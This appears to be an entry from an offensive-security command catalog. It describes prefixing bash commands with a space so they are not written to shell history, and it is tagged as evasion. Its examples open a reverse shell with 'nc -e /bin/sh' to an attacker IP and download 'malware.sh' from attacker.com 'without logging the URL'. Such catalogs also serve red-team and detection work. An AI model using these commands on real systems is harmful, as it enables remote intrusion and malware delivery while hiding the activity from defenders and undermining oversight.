---
id: 4667c506-2224-49a6-a209-df5f8c4c47a1
name: bash-execute-command-with-leading-space
type: command
executor: bash
data: ' $_COMMAND'
output: null
created_at: '2023-04-06T03:56:17.656991+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - evasion
  - history
verified: true
validated: true
---

# bash-execute-command-with-leading-space

## Command

```bash
 $_COMMAND
```

## Description

Executes a command with a leading space to bypass history logging, assuming HISTCONTROL=ignorespace (common default).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_COMMAND | The full command to execute (e.g., nc -e /bin/sh attacker_ip 4444) | Yes |

## Examples

### Basic Usage

```bash
 nc -e /bin/sh 192.168.1.100 4444
```

### Advanced Usage

```bash
 wget http://attacker.com/malware.sh
```

For downloading payloads without logging the URL.

## Expected Output

Output of the command itself. The invocation won't appear in `history`.

## Related

- [[procedures/Linux-Command-History-Evasion]]
